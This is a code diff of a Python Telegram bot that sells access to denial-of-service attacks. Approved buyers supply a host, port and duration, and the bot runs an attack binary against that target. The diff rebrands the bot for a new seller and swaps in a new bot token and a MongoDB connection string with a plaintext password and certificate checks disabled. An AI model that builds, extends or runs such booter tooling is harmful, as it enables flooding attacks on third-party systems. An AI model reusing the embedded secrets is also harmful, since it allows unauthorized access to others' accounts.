@@ -13,16 +13,16 @@ from threading import Thread
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7709967058:AAHTeQYp5YHo_ZwgzfFvF5uFc_HMtgZmJ7s'
-MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
-FORWARD_CHANNEL_ID = -1002290518687
-CHANNEL_ID = -1002290518687
-error_channel_id = -1002290518687
+TOKEN = '7994610793:AAE_geiZ8e_ebXrS6NuRSR5HBSOUhpJS2gU'
+MONGO_URI = 'mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
+FORWARD_CHANNEL_ID = -1002676186958
+CHANNEL_ID = -1002676186958
+error_channel_id = -1002676186958
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['rishi']
+db = client['VIKASH']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
@@ -35,7 +35,7 @@ running_processes = []
 
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./soulcracks {target_ip} {target_port} {duration}"
+    command = f"./vps {target_ip} {target_port} {duration}"
     try:
        
         process = await asyncio.create_subprocess_shell(
@@ -79,7 +79,7 @@ def check_user_approval(user_id):
     return False
 
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@KRISHNAVIPOWNER*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACCESS:-@RAHUL_MODS_OWNER*", parse_mode='Markdown')
 
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
@@ -157,7 +157,7 @@ def attack_command(message):
             return
 
     # Send the prompt for attack details
-    bot.send_message(chat_id, "*Please provide the details for the attack in the following format:*\n* <host> <port> <time>*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*PLEASE PROVIDE HOST PORT SEC*", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack_command)
 
 def process_attack_command(message):
